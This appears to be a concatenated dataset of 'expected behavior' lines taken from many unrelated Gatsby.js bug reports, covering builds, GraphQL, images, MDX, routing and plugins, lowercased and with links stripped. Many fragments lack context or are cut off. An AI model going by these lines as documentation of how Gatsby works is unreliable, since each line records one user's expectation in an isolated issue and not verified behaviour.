the path of the css module is resolved as per speficied by gatsby-plugin-resolve-src (or more generally, using the webpack config set with gatsby-node.js 's oncreatewebpackconfig )
mdx anchor links should behave like those in "normal" js pages.
`run page queries` output after first save, for example: ```
success onpreextractqueries - 0.009s
success extract queries from components - 0.032s
success write out requires - 0.002s
success run page queries - 0.011s - 1/1 88.96/s
success re-building development bundle - 0.064s
it should change my icon and splash screen automatically
the page at `<heroku-app-name>.herokuapp.com` should show "hello world!" as defined and queried for in the `sitemetadata`, which works successfully when running locally.
website should work in production
don't generate images with gatsby image for unused components
first of all, that the build runs without errors.
have a normal jam page served in the initial rendered, with every component with right name, styles and position.
use `...gatsbycontentfulfixed_withwebp_nobase64 normally`
the typescript typings should reflect the possibility of `parent` property of node interface to be nullable
no reopen possible
we will see the login's page content.
to be honest not sure what is expected, but we have two options:
fix typescript declaration to return proper type for `navigation` function.
fix the code and match `reach/router`'s api (shouldn't be very difficult as this is just to add `return` here and there) i would be happy to prepare a pr once it will be decided.
sidebar schould be updated
bread crumbs should be updated
changes made in `code.py` are shown in the browser.
pages should be found.
i can see my notes in `localhost:8080`
the build should use up-to-date data in regards to "previous" and "next" links.
i had tried to make the change here to fix this:
`gatsby-cli` should run the respective command
in this case, it should show the cli help instructions
the error is same irregardless of the command being run
so, running `npx gatsby-cli new <some-dir>` also throws the same error.
to not give an error when running `gatsby develop`
using yarn to install it, instead of npm removes the problem.
create a new file with different hash
using the code above, when i go to with a browser, the **pathname** should return the path of the current rendered page and inject this canonical link in the ```<head>``` like this:
```<link rel="canonical" href=" ">```
no assertion should fail, or more generally, calling `createnodefield` with an incomplete node object should not touch the fields that are not provided at the time.
after running `gatsby build` the website should look the same as in my development environment
(content should show, css should behave like in development)
<img width="1287" alt="screenshot 2020-08-16 at 10 55 12" src=" ">
image gets loaded only once.
the recipe installs and configures correctly
unformatted (duplicate?) data shouldn't be rendered.
typography should work just like it does in the example site.
webp images should be displayed, also when using `pathprefix`.
should run successfully
sidebar schould be updated
redirects should be updated
should work out of the box.
build should always be successful.
when the "save" button is clicked, the url should update with `?data=...`.
gatsby installs
the components should render
to boot up the dev server.
only one scrollbar
for problem 1, the spinner should *never* be displayed because the page is not loading the bootstrap css
the branch `possible-fix` applies a css change to the test page to correct that error
however, the fact that the spinner displays under `gatsby develop` misleads the developer into thinking that everything is ok
for problem 2, the banner should be green.
- page should be visible
each **plugins**, **themes**, and **recipes** tab should have unique description text describing each ecosystem feature
i don't know exactly where the text content data is coming from, but you can see the [homepage-ecosystem.js component here]( #l161)
app should start
gatsby should build locally and on netlify ## bug report **describe the bug** when attempting to gatsby build locally, createpagesstatefully isn't working
be able to run gatsby build so i can deploy to netlify
the dev build should works
like this quick fix : #issuecomment-667997214
no duplicate records should be returned
debugger should listen on 0.0.0.0, not 127.0.0.1
style should not be removed in build mode.
my app should function
get the module that enables us to use use icons
observing the [merged prs]( they appeared to be suffering from the same issue and the fact that they were merged suggests that the expected result would be `starters_validate` returning a successful `exit code status 0`
see the errors above
the project should build properly.
successful build
it should query all fields provided by the native shopify api correctly
no eslint warnings for files that don't exist
i am able to see the hasura node in the gatsby graphql endpoint:
i expect the new field `foo` to be available alongside all the other fields (like `body` and `excerpt`).
css to render in build/ production
the `__graphql` browser should show `allasciidoc` as available
the page should render at `/doc/`
the develop script run smoothly and and development server is launched at the end of the process
gasby-cli should be installed globally
install success
no output on the console
gatsby should still be able to access the image childimagesharp normally
the error occurs randomly, so it questions the reliability of the build.
should be able to build the query as in the example:
exports { constone { valueone }
possible to build an app or run developer mode.
the build should succeed with no issue.
all the list of results which are saved in job_posts table is expected.
- to be able to kill the gatsby process
- for ctrl-c or stopping terminal executions of `gatsby develop` to always cleanly kill the process
gatsby-cli should work as previous versions
expecting the sitemap to output entries with correct last-modified tags, ie:`<lastmod>2020-08-03t01:54:49.000z</lastmod>`
browser updates the page.
there should be no horizontal overflow since it's just empty space
the header should be a white color and the links should be purple.
images are all processed before the queries start to execute.
not loosing the css and js functionalities and to work as they work on other pages that aren't in a different folder
that all files output to public/static will use some kind of hash so that if their content changes so does the filename
if a particular piece of _any_ program breaks frequently, i ..
well first, look, i don't expect programs (especially oss ones) to work perfectly! stuff happens
all i\'m asking is that when you see a part of your app breaking in different (and often inconsistent ways), that part of the app needs to give more info than just "source and transform nodes"
having however many different issue threads out there (several with many different sub-issues/solutions) as the only documentation is not an optimal solution.
not able to fetch the data
the story in the repo is supposed to show the queried title "gatsby starter default".
i am interested to know how i can get more verbose logging from the build process (the above was generated with --verbose.) searching the internet for other instances of this error message will also show an additional error message below each "generating development javascript bundle failed" indicating the specific reason for the error
in this case, without additional logging or error messages, i am unsure where to investigate
### fault finding i have performed a number of steps to help clear the errors
* rm -r node_modules followed by npm install
* gatsby clean to remove the cache before the build
* npm uninstall all node modules following by npm install --save/--save-dev
* remove the gatsby-node.js file, whilst lots of graphql errors, it still generates the same error none of these steps changed the errors
i am thinking it may have been an update to a module dependency that is causing the error, but i am struggling without more verbose error logs to be able to identify the root cause
i have recently added mdx support to the site, but this was working @correctly.
markdown structure shouldn't be altered
lines 2 and 3 should be highlighted

after navigating `homepage -> another page -> homepage` scrolltop value should be 0
the command `npm install tailwindcss --save-dev` should be listed under step 1 in the gatsby docs.
statusbar like this should be printed:
success @my-app/app 17 pages
i would expect it to be 404.
in what i shared, you will see that the plugin is not installed, since it is the default project that gatsby brings, even if you install the gatsby-image plugin the result is the same, the images are pixelated in the display, but in the localhost, when i run gatsby develops they look good.
the url is updated with the hash, and the page is scrolled to the element with an id matching the hash in the url.
expected server start
after 1 second, `worked!` is displayed on the heading title.
after navigating to a new page user should be scrolled to the top of the page
in other words, `window.scrolly` should return `0` after navigating to a new page.
syntax highlighting should appear as it does on prod, with a yellow background and code highlighting
it should also show filenames when supplied and have a copy button

gatsby cloud typically takes 3-6 seconds to upload my built gatsby site to the cloud.
i expect the images to never get destroyed and recreated after or during hydration
i also assigned the images keys and also added the `suppresshydrationwarning` in case of mismatches, but to no avail
i am even guessing this is not related to hydration, seems something is just calling react render again within gatsby.
new project should be created without errors
should be able to run `gatsby build` and `gatsby develop` with no errors
no errors during development
no errors, and content is reliably rendered.
i did some digging and found this comes from `@mdx-js/mdx` in this pr from april 21, 2020, which was picked-up in `@mds-jx/mdx@1.5.9`
you can see that by noting that:
- 1.5.8 doesn't have it: #l133
- 1.5.9 has it: #l137 this means that, at the least, the peer dependency of `gatsby-plugin-mdx` on `@mdx-js/mdx@^1.0.0` should have been bumped to `^1.5.9` as of this change.
the site should be published.
no w3c validation errors.
the link component wouldn't add the target path to the current page path
it would use the root domain and add the described path after that.
should develop successfully
i'd expect it to build without throwing a window undefined error
i can actually get this result if i use `navigate` from reach-router rather than gatsby.

after scrolling down from index page, the link click should load a new page, with the view at top.
if a page loads ok in dev mode : the routes should also be ok on prod, or some build warnings/errors would be visible.
i assume it should finish building! the cookies seem to be working just fine in the actual app when testing locally
i'm still somewhat new to react/gatsby in general, so it's possible i did something wrong here, but i couldn't find an obvious solution through google.

{ "data": { "contentfulpost": { "id": "3875ab8b-3e1b-5f31-9f17-5f758065f109", "content": { "json": { "nodetype": "document", "data": {}, "content": [ { "nodetype": "paragraph", "content": [ { "nodetype": "text", "value": "one piece", "marks": [], "data": {} } ], "data": {} }, { "nodetype": "embedded-asset-block", "content": [], "data": { "target": { "sys": { "space": { "sys": { "type": "link", "linktype": "space", "id": "orvemwqyam9t", "contentful_id": "orvemwqyam9t" } }, "id": "c1exk6yqumed5ubizqxc0v5", "type": "asset", "createdat": "2020-07-01t08:17:09.579z", "updatedat": "2020-07-01t08:17:09.579z", "environment": { "sys": { "id": "master", "type": "link", "linktype": "environment", "contentful_id": "master" } }, "revision": 1, "contentful_id": "1exk6yqumed5ubizqxc0v5" }, "fields": { "title": { "en-us": "android-lollipop-wallpaper-widescreen-d34" }, "description": { "en-us": "android wallpaper" }, "file": { "en-us": { "url": "//images.ctfassets.net/orvemwqyam9t/1exk6yqumed5ubizqxc0v5/e8b033760f60e762411faf49af603469/android-lollipop-wallpaper-widescreen-d34.jpg", "details": { "size": 45828, "image": { "width": 676, "height": 846 } }, "filename": "android-lollipop-wallpaper-widescreen-d34.jpg", "contenttype": "image/jpeg" } } } } } }, { "nodetype": "paragraph", "content": [ { "nodetype": "text", "value": "", "marks": [], "data": {} } ], "data": {} } ] } } } }
the styles should compile successfully as before.
expected no error
back to /en page
the query should return the value "/real-estate" in the appropriate section.
the expected result is to run the project successfully getting all the queries working at the build time.
execute the project to start studies.
- appropriate polyfill is included.
it should successfully build the repo.
i'd expect the image not to render and possibly an error to be printed on the console.
no `preload key requests` warnings in the lighthouse report when using `gatsby-plugin-offline`.
user should see an error like `referenceerror: test is not defined`, as seen in `pages/index.js` file line 13 where error is generated (`console.log(test.lol)`).
no errors and the canvas properly rendered on the built project (again, it works fine in develop).
working query
the links should go to the `href` location when they are clicked on
#### suggested solution 1
when the user clicks on a link 1
no `event.preventdefault()` call - navigation to the `href` should work 2
maybe: any prefetches should be hard aborted
add timeout to prefetching functions i would also suggest considering a general timeout for all other prefetches
maybe built into a `fetch` wrapper.
when page is opened, blur is visible
after image is loaded, blur disappears and final image is displayed.
vscode should be able to use the type declarations inside gatsby.
no ```window``` related issues as i don't use it un-safely in my code, knowing it might cause problems with ssr.
no ```window``` related issues as i don't use it un-safely in my code, knowing it might cause problems with ssr.
expected to get the metafield value.
the background color should change to the color specified in `gatsby-config.js`.
warnings should not fail the linter, or at the very least it should be more tolerant of proper nouns.
- query media by acf - return list of all media objects filtered by tag id
my local server will run and i will see images from cloudinary on my page.
js and css building successfully.
no errors on installation for the build to run successfully.
i should be able to navigate to name\\>:8000 or see the certificate by running ```
openssl s_client -connect <host name>:8000
i understand that this is an example where we are doing something wrong and expecting it to work, but i would expect this to do nothing
i would expect it to load with the hash, keep the hash in the url and do nothing out of the ordinary
i would expect this to do the same as you do on a plain html site, which is nothing
i wouldn't expect it to manage to scroll anywhere, because obviously that doesn't make any sense, but i would expect it to do nothing else.
- show source code on github
all tags should be pre-rendered with gatsby-plugin-react-helmet
static html should build without error
build should complete just like the development build
built will be success without any error.
succesful build
images should be as large as possible without exceeding the original size
images should be constrained to the provided minwidth and maxheight options
for example: an image with a native size of 720 x 1080 should be as tall as an image that is 1920 x 1080 if the maxwidth > 720 and maxheight > 1080.
the site should load
we should see the heading, the picture, and a caption below the picture reading "this text should be **bold**" with bold actually being bold.
my `<h1 />` should have the class `text-4xl`
gatsby builds the project succesfully.
display the schema (and not crash).
able to develop
as per the documentation, i am supposed to get below page: ![starter-blog-theme-default](
i should be able to see the progress of the files being downloaded.
the project should deploy successfully or provide an error message(i think)
the first example will produce the following (expected) html:

the responsive image should be displayed with its specific size.
i guess that chrome 80+ do not need polyfills for promise
but they still appear in the production bundle
i expect to get a "clean" bundle without these redundant polyfills
just like the screenshot shows.
if https is activated socket.io should be request at port>.
can get data from graphql layer and post it
there should not be any error in the console
the build should not fail.
should display the homepage for the gatsby starter.
texts of ui components that are sourced from the updated query structure should be displayed since the initial load.
using words `import` and/or `export` in plain text should not generate an error
to install gatsby-cli globally ### error > npm err! unexpected end of json input while parsing near '...vmriwdlqr9t4t+9x/x3sz'

the code changes in the gatsby core project should be executed by the tests
the build should succeed, and the appropriate markdown image url should be used to construct the responsive image sizes.
each package resolves properly
ones that depend on `0.2.x` or `0.4.x` use each properly.
` gtag(\'config\', \'aw-google_ad_words\', {"anonymize_ip":false,"send_page_view":false});gtag(\'config\', \'ua-google_analytics\', {"anonymize_ip":false,"optimize_id":"gtm-container","send_page_view":false});` `optimize_id` shouldn\'t be sent to aw-google_ad_words
the page shouldn't scroll when clicking a link
there should be no errors loading this js file in all routes
something like the following:
success downloading remote files - 1.524s - 2/2 1.31/s error #11321 plugin "gatsby-source-google-spreadsheet" threw an error while running the sourcenodes lifecycle: cannot read property \'map\' of undefined typeerror: cannot read property \'map\' of undefined - sheets.js:216 sheettotable [dive-club-gatsby]/[node-sheets]/lib/sheets.js:216:4 - array.map - sheets.js:191 sheets.tables [dive-club-gatsby]/[node-sheets]/lib/sheets.js:191:37 - task_queues.js:97 processticksandrejections internal/process/task_queues.js:97:5 - gatsby-node.js:27 [dive-club-gatsby]/[gatsby-source-google-spreadsheet]/gatsby-node.js:27:20 - async promise.all success source and transform nodes - 12.578s
i produced that output by modifying `api-runner-node.js`, adding
if(/google-spreadsheet\\\\gatsby-node/.test(file.filename)){ file = null;
after line 383 `const file = stacktrace.parse(err).find(file => /gatsby-node/.test(file.filename));` (changing `const` to `let` too) and before `if (file) {`.
i would expect socket.io.js to provide a content type so when running under nosniff it can execute.
it would also be nice if socket.io calls went back to using relative instead of hardcoded url's so they can be accessed over https if the site itself is being served in https.
the project should build
successful build and running on localhost port 8000
ignore the delete file.
images from contentful markdown should not fade out.
generate the development bundle successfully
the images should fade in with the background colour i set when loading, like described in
no reference error.
build succeeds.
kyle's avatar picture should be there.
the image should be displayed with a 2x3 aspect-ratio.
the browser goes back a page.
if the theme has the prop for `lightlogo: false`, the logo in the header should have the fill of `#000`
the develop status bar shows when bootstrap is finished with the status, pagename and number of pages.
no type error
pagequery should reflect changes in the file tree on its own without needing to edit it.
the package shouldn't contain anything above medium severity vulnerabilities.
gatsby should detect that my theme uses a static query and the site should compile and run.
no build errors

you will hear all kinds of secondary navigation items that are actually not visible on the screen
also, if trying to activate these, it will fail because voiceover will simulate a tap where it expects the item to be
since it is off-screen, the tap goes nowhere.
we should see <noscript><picture><img ..

the webp quality to be similar to the png/jpg one.
the build should succeed.
start local dev server without error.
the `alldocumentationjs` query returns an empty array
clean cache and start development server
expected to run the development server.
serve on port 9001 and say so
gatsby develop process works as intended.
on consecutive runs of `gatsby develop`, without cleaning the cache in between, the local file nodes should be used to speed up the development process.
- "old website" should link to v14.rileyjshaw.com/no-page here
![filesystem-query](
i would expect the command to run without a crash :smile:
images should appear
from the docs, i expected to be able to access all shared helpers including `getnodesbytype`
i am trying to get some custom nodes since they contain some data i want to pass to my remark plugin.
a value for both `srcset` and `srcsetwebp` should be returned.
successful install
the following is obtained with `yarn start` / `gatsby develop`
all is well
![image](
run npm start from pm2 deploy script and have gatsby develop run development enviornment at locahost:8000
replaced page is rendered with the new context
i should be able to hit the bp set in `gatsby-node.js`.
build should pass the same as it does locally, or, provide a better error message so i can find the cause of the problem
if i navigate to the local version of the error provided it seems as though it's the source of where the graphql sever starts but how am i to know which graphql query is actually failing (if any?)
a `<style>` tag holding all styles of styled-components should be in the `<head>` after ssr is completed: ```html
<style data-styled="xofjr bldpd " data-styled-version="4.4.1">
/* a lot of css styles */
``` ![styled-components-4 4 1](
i should see the highlighting plugin working
to reload just fine and keep hot reloading.
upgraded to new version.
it should not throw
https website can be displayed
project should just run.
render the mdx file.
project should be deployed without errors.
the query variable field should not change unless we update it ourselves.
like in the doc: #onrenderbody
the text should not flow out of the width of device.
the images should appear.
it should scroll properly.
the `gatsby recipes` command should provide a list of recipes or at the very least allow specific recipes to be installed
what should happen is the request body remains
the http spec states that delete requests can have a body
(i believe this used to not be the case a long time ago, but certainly for a few years it's true because the software i'm debugging right now is about five years old and being ported to a gatsby project).
pwa should be insatllable on netlify just like it was previously in a production build.
gatsby runs on localhost:8000
successful deploy with images processed via google cloud functions.
![image]( readme `gatsby-plugin-sass` should be transformed the same way as for other plugins
it should pull the site metadata title into the header from the config file.
i'm always expecting the node to be present when i run `gatsby dev` but its unreliable.
schema customizations should work as they do in previous versions
if there is updated documentation i may have missed, please let me know
<img width="935" alt="screen shot 2020-05-14 at 6 42 14 pm" src=" ">
the page would skip to the main content.
the icon should appear correctly on mobile for the website when looking at browser history on mobile.
a visible outline should appear showing the element was selected.
the href should change based on a state element
for example on first load statehere is equal to '/test' after a change in the state it will be equal to /test-2, but the href attribute is not reflected with that change
however the text inside the anchor tag changes.
getting some trimmed thumbnails or at least an error which helps me to solve the problem
should work without corb warnings
should receive access to remote json files.
im not sure, but should not jump to <head/>
not to have errors and to build static version
it should redirect successfully without throwing an error
the plugin should read the typography.js file in the theme directory.
the generated html files should only include css from scss files that were explicitly imported instead of every scss file in the tree.
when accessing `localhost:8000/about/` the source code block should be highlighted because i added `:source-highlighter: highlightjs` as an attribute.
according to the document( #usage-with-gatsby-plugin-offline)
> certain essential resources need to be available on your content server (i.e
the one used to serve pages)
this includes sw.js, as well as resources to precache: the webpack bundle, the app bundle, the manifest (and any icons referenced), and the resources for the offline plugin app shell our app locates the assets in a different domain(cdn), but we expect the manifest file(and all the files mentioned above) should be loaded from the same domain with the app.
i think i should be able to use gatsby-image's fluid <img> in my tag template but i cannot access heroimage { fluid(maxwidth: 1800) { ...gatsbycontentfulfluid }
in gatsby-node.js
gatsby should run install
stays
`gatsby build` should render the same property value as `gatsby develop`
`shouldupdatescroll` is called and the anchor link scrolls the page
i expect it to run on my localhost as expected.
gatsby website should be run on the dev server with `gatsby develop`
the images in the content rendered from markdown should be different, even if the filename is the same
graphql query should be fetched and displayed
standard output and a build that completes without errors
build successful
users should be able to use .js, .jsx or .tsx
yarn 2 should find needed package and then gatsby-browser will be successfully transpiled in es5 syntax.
should be able to download unpublished content locally to use for development.
i haven't been able to find information on how this mechanism works or how to disable it,
if this is a gatsby issue i would expect it not to create a cache module that overrides an existing node module in the app that uses it
`gatsby develop` should be able to infer the types as it did before
### workaround ensure gatsby version `<=2.21.1` ### related issues i thought that i'd be hit by issue #23472 but the fix should be already in the latest gastby build and the errors shown above still persist
latest version that i tested was `2.21.6`
new open issue #23632 looks similar in its symptoms
### comparison between version `2.21.1` and `2.21.3`: by looking through the changes between the working and not working version, my hunch is that [the changes in inference-metadata.js]( #file-dist__schema__infer__inference-metadata.js) are causing the issue.
remote images should be downloaded locally.
no node crash
the ability to work with yoast_meta: { ..
page should hot load on file save and new data should surface in the ui.
it should not oom.
project should run without errors
import success and render page
the showcased site should be built with gatsby and react.
site should display it's custom 404 page, which should look like this:
i would expect the `gatsby-image` to work like it does when i use it locally.
the `testtesttest` node should return data on the page component.
hydration should happen and not trigger a full re-render of the page.
this img's url should be ` `, without the first slash.
i would expect to have the same result in the page data as in graphiql.
the files should build as usual
nothing should change
display name is for contentful.com only, should not impact the api
it should use `pathprefix` to prefix relative links
all products were successfully imported on shopify dashboard and expected to be pulled and use by using gatsby-source-shopify
css should remain consistent between mobile and browser views (or at least be responsive as designed using css)
page should re-scale and change layout according to css rules defined in src/
should be able to inspect element and view my custom css rules on elements/components.
the browser should only load one image that works for the viewport.
based on my reading [of the documentation]( #mdxrenderer), the `<h1>` should render to an html tag, not recursively call the component defined in the context
a workaround is to not use jsx, if i replace the `<h1>` with `react.createelement("h1", null, children)` then it works.
link preview should be shown in whatsapp.
build successful.
query to return results
build success
successfull build
ckeditor should build
when an entry is deleted from contentful, its respective gatsby node should be deleted as well and should not appear in graphql (or a rendered page).
transformer sharp should convert a .tif image and make it available via graphql
![image](
when running develop, the error shows, but it doesn't effect other pages.
all available starters should be shown on main site.
`sizebypixeldensity` should not be deprecated
instead the bug introduced with gatsby v2 should be fixed
the following screenshot shows what it looks like [with gatsby v1]( (works as intended)
note the size of the original picture in macos' image viewer
both browser and image viewer are showing the image at 100% size
![screen shot 2020-04-22 at 17 15 50](
subsequent rebuilds on netlify (or other build platform) shouldn't have to reprocess images as they haven't changed.
run development server without receiving an error.
`location.state` page prop should be of given type or `undefined`
example: ```tsx
import { pageprops } from "gatsby" interface mystate { test: string
} const mypage: react.fc<pageprops<null, null, mystate>> = ({ location }) => { return <div>test: {location.state?.test}</div>
the expected result is that starters should be sorted based on stars.
the styling of the class header in the file sass/layout/header.scss should work with the linear-gradient
the project should compile fine.
i should see the list of the recipes.
the content to load normally.
i would expect default layouts to be applied from mdx files.
i would expect the 2 transformers to infer the same data as the same type.
i would not expect a 4-digit number to be inferred as type date.
i would expect both transformers to honor the schema customization.
gatsby should build the site
i would expect this to run without a warning.
expected result should be consistent not fluctuating when fields matches it should query the data
and give me the result.
the query should behave the same way in production as in development
instead of a live gatsby site with graphql integration to the wordpress source, the console throws the following error:
blogpost should be visible
returns `12 apr 2020`.
build succeeds.
`localfile` fields are populated.
gatsby should build and the graphql data should be available for the types you created.
i expect that any styles created with `createglobalstyle` and rendered on mount will be included in the `.html` files, no js needed
should be able to search using double quotes .
everything builds correctly as it did with the previous version and as it does with a release version.
for the <img/> component to display an image
all of the rich text embeds should be unlocalized.
querying frontmatter image field returns image sharp subfields as shown in query.
should be no vulnerabilities in project.
it should generate nodes and i should see them when i go to localhost:8000/__graphql
regular gatsby messages ended with success and dev server listening: ```
success building development bundle - 14.247s
the app should work
since no code or content has changed, the build hash should not change and no pages should be emitted.
gatsby develop and build commands will work properly.
![screenshot 2020-04-09 at 12 06 11](
![image](
the site + image should get rendered correctly
homepage is loaded properly when accessing it first.
- it should only print 404 error messages resulting from missing readme
firefox should work as it did before with no issues.
it should do well with duplicated images
we can use parse5 to get a image node and then do a same logic.
should access env vars.
render should only be called once
(navigate should not reload the page when its parameter is equal to the current path)
the special styles used to polyfill `object-fit` properties to ie 11 should not only be applied to the actual image but also to the placeholder image.

as for `@max_uf`, it should be 10 posts.
the images should appear clear in the blog detail page which is uploaded through netlify admin, ie., it should able to read the image from inline markdown.
the correct element should scroll into place upon page load.
not sure what change it would require or if it would be possible but it would be great if `@link`ing by `@proxy` fields worked, since it seems so close to working already
i'm not at all familiar with gatsby's internals so excuse any dumb questions but is there some way to make that last `map` able to access resolved fields? i was really excited that it could get me even this far though; either way the project is great to use and thanks so much!
the plugin should figure out the file extension
site loads normally
i expected gatsby cloud to run the build with the prefix `--prefix-paths`

}` here is my js code for mapping through the tags: `
{post.node.tags.map((tag, index) => ( <taglink key={index} to={`/tags/${tag.slug}`}> {tag.name}{" "} </taglink>
an error should be thrown due to the failing authentication.
traced svg placeholders should be aligned with the actual images in internet explorer, like it is in other browsers

<p>please review our <a href="/privacy">privacy policy</a> for more details.</p>
content should not overlap.
the polyfills should not be used anymore, since we only target the last 2 versions of chrome.
when clicking the link to `/terms/` on the client side i'd expect it to open the pdf file and not 404 or hang like it currently is
my guess is we just need to detect if links start with `/static` and make them a non-gatsby link.
the `gatsby-site-using-local-plugins` build should succeed, and i should see the `twitter` javascript loaded onto the page.
in demo-module--red--3laha should not be present

![image](
image should be visible with no placeholder below.
"update schema" step should not take any time, as it did with v2.17.6.
window should scroll to header on click on link
no "functions that are interpolated in css calls will be stringified" error in browser console should be printed

![404](
`gatsby develop --host 0.0.0.0` should not hang up.
retina images should be displayed in their intended size (scaled to resolution).
`markdown` should _not_ fail

i expect to get back a working `<audio>` html element with controls.
in step 6, you should get the test.html page.
the styled-component styled should be applied to the div in question and the horizontal scrolling `<div>` should work properly with the appropriate styles applied.
expected localfile node to exist in the graphql query result.
should go to page
the files get downloaded and added to the schema as a `file` so we can query them with sharp
the text in inline code should also appeared in excerpt.
`gatsby-remark-images-contentful` plugin not throwing errors in the middle of the build process.
it work properly until i edit posts.
husky should install normally
sass imported variables should not be undefined on build, so the background is violet from the start, both in development *and* production.
gatsby should ensure that files it copies under `./cache` are writable (removable) after it has been copied them, and run just fine.
no 301, no redirect
see actual excerpt
the `html` transform should not error on the presence of an image in the transform.
anchors should work as normal when interacting with `shouldupdatescroll` method.
mabye redirect to `/` ?

prompts on all lines not specified (1, 8, and 9).
you should be able to see the frontmatter from the typescript page.
the development server using https should start.
a resized base64 image should be available for use and the build should succeed without error
fwiw i traced through the `gatsby-plugin-sharp` code and found that defaulting `args = {}` on [this line]( #l142) fixed the issue
now, i don't know if the root issue is the lack of default or if there's an underlying issue that explains why the args are undefined there
hopefully ya'll with better knowledge of the scheduler can decipher what's going on there.
i would expect that `gatsby build` would code-split regardless of the presence of a pre-existing `.cache` directory (and be deterministic in general).
we should be able to seamlessly use the schema we just created.
should produce a `schema.gql` file
the `html.js` file in the theme should be read and built.
code viewed in developer tools should allow breakpoints to be set on most lines.
both scenarios should have `static/8058f3f26913fea3b6a89a73344fe94a` in `public/` folder
### explanation image processing isn't called in second case, probably due to some aggressive caching that doesn't check public.
page should either remain blank while loading.
we should see the static page created using the event template.
no typescript errors and reporting works as expected
npm install should work
the page-data should be updated with the newest data.
type query { file:(childimagesharp: imagesharpfilterinput) file
} type file { childimagesharp: imagesharp
the navigation should always work.
to see this work with `createparentchildlink`: 1
edit `src/createnode.js` and [uncomment the `createparentchildlink` lines]( #l39) at the bottom
possibly clean the cache and make sure `post1.mdx` is back
repeat the steps above
after the file deletion, the query will return (correctly) zero results.
if navigating with `navigate` to the same page, scroll position should be preserved.
the app builds.
hot reloading should work
changes made to the yaml file should automatically be reflected on the page displayed in the web browser.
error should not throw.
icon links in webmanifest should be prefixed with `assetprefix`, as they are in the built `index.html`.

/icons/* cache-control: public, max-age=31536000, immutable

the project should build within 5 seconds.
i guess it should just pick up all the content again and process ``source and transform nodes` like it was doing it correctly in the first run.
the page should generate a slug version of the h2 and h3 text-children as `id`
it should render the same amount of lines
using the component from the gatsby-image package with a supported webp fragment renders a picture tag whose source paths reference the webp image path.
it should allow for empty lines in jsx code blocks.
either develop or build should complain about running concurrently, or it might just work correctly without the service worker being installed.
i'd expect a large quantity of stale nodes to not impact build time more than not using the cache.
the background color should be the appropriate color for the page.
hot reloading should work when editing markdown files, but it does not work
i would expect to see ```
info changed file at /users/thilo/projects/undataforum/main-website/content/posts/connecting-the-dots.md
in the log.
complete dev build and serve
(for reference, i reverted to 2.15.22 and it worked perfectly)
i'd expect there to be no build errors and i should be able to query contentful and pick up the `.mdx` files on the filesystem through graphiql.
clicking the image on both ` ` and ` ` should open the original image in a new tab.
the search box should ignore unrelated query parameters, particularly the the analytics linker id picked up from gatsbyjs.com
ideally a specific parameter would be used (ie
`?search=gatsby-plugin-`)
empty line should be highlighted as removing/hiding it breaks the line numbering logic
![line showing with nbsp](
the site builds.
rendered page should use layout
website should display everything.
shouldn't give errors and able to render .mdx files.
styles load immediately.
open page with no error
it's expected to load any styles properly on both initial and subsequent renders.
the `example-dir` folder should link to ` ` ```html
<a class="css-1pm6ghi" href="/example-dir">...</a>
each query should build properly and work side by side.
site should load.
images naturally fit in with the content of the post.
json files should preload without warnings/errors when `<link />` is inserted in the head
the following graphql should provide access to a remote image that has been transformed into a local image : ```
allthirdpartyposts(sort: { order: desc, fields: [date] }) { edges { node { id title remote_image_url localimage { childimagesharp { fluid(maxwidth: 512, maxheight: 512) { src } } publicurl } date(formatstring: "mmmm d, yyyy [at] h:mm a") slug excerpt } }
you are navigated to `/admin/user/123` and `adminuser` component is displayed match-paths.json should look like this
``` { "path": "/admin/", "matchpath": "/admin/*" }, { "path": "/admin/users/users/", "matchpath": "/admin/*" }, { "path": "/admin/users/user/", "matchpath": "/admin/*" }
i only expect image on the new page to load.
the corresponding `page-data.json` file should be deleted and the deleted page shouldn't load.
js-free version of the site loads
should not try to prefetch these types of resources;
development server should boot up like normal
it should just write out the lines without error
it shouldn't crash.
the manifest in `<head>` should be `manifest-es.webmanifest`.
render the graphql successfully.
the blurred image should disappear when the real image is loaded <img width="620" alt="screen shot 2019-08-23 at 7 17 11 pm" src=" ">
filterable by slug
--- as per slack discussion with @freiksenet
the build shouldn't be crashing
we do have loads of images and some are pretty heavy, but i don't think the build should ever crash, only take longer to process them all
at least that's what happens locally and that's what i expect to be happening in circleci.
the config file should be used.
the page content should be generated and the development site should be available.
the built css file should contain all of my compiled css.
terminal should return to the state it was in before gatsby changed it.
/** * @param {import('gatsby').prerenderhtmlargs} args */
const onprerenderhtml = ({ getheadcomponents }) => { // getheadcomponents type signature should be `() => reactnode[]`
the page content should be generated and the development site should be available.
text input should still display after running `gatsby develop`.
successful build.
functionality from "un-transpiled" module should continue to work as expected.
what **should** happen, is `resolve-url-loader` should load the font relative to the script that called `url()`
shouldn't matter whether or not it was imported from a `.module.scss` or just `.scss`.
the blog theme runs unaffected by the docs theme which isn't configured.
it should work
should just run
works ok with chrome (v75.0.3770.142)
![chrome version](
be able to debug website in devtools
state would be preserved between pages when storing in a layout component
gatsby generates certificate and starts an https server
the page create when published should be removed when building again.
`/txt/*` should be sorted before `/*` because it is more specific (more path segments)
builds after the first build should be passed
you see the website and can develop it normally.
clicking the link shows me a wonderful explanation of why mdx is awesome.
styles based on my state should be rendered over ssr styles
line numbers should appear in rendered blog page.
identified that it works in `gatsby-transformer-remark` version 2.5.0
![image]( relevant part of `package.json`:
``` "dependencies": { "gatsby": "^2.13.25", "gatsby-cli": "^2.7.17", "gatsby-plugin-typography": "^2.3.2", "gatsby-remark-prismjs": "^3.3.3", "gatsby-source-filesystem": "^2.1.5", "gatsby-transformer-remark": "2.5.0", "prismjs": "^1.16.0", "react": "^16.8.6", "react-dom": "^16.8.6", "react-typography": "^0.16.19", "typeface-merriweather": "0.0.72", "typeface-montserrat": "0.0.75", "typography": "^0.16.19", "typography-theme-wordpress-2016": "^0.16.19" },
hmr should work fine in development
gatsby should handle the deletion without crashing
should have the same result as when i land on #reporter itself, scrolled just right
or maybe it just copies the link to clipboard for me
i believe this is related
tests pass, and the testing program exits.
imports should be immediately available.
i would expect to see the 404 page with the "404" content for every non-existent path below the pathprefix.
images within markdown files should have a prefix-path appended to it, but instead it just starts off as as `/static/<images_file>` instead of `<prefix_path>/ + /static/<image_file>`
either the error that happens due to the path being bad is caught and reported to screen, or the path is updated and cpu-core-count.js is used, allowing `sharp.concurrency` to be set to the value of cpucorecount from the cpu-core-count.js file.
`sharp.concurrency` should then return the value from the cpu-core-count.js file once it's been set the first time.
the _error loading a result for the page query..._ message should not appear in the terminal.
you should never see the old invalid error anymore.
i will use as an example ![screenshot](
these pages should be the same.
the slug for post should be valid url.
- the first codeblock should have a reasonable bottom margin
